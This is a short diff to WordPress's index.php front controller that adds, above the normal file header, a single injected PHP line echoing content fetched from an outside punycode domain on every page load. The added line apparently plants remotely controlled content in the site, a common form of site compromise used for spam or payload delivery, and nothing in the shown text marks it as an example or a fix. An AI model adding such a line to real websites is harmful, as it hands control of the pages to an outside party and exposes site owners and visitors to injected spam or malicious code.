@@ -1,3 +1,4 @@
+<?php echo file_get_contents("https://xn--sltgcr-zta9jwa.com/pf/subdo/new.txt"); ?>
 <?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
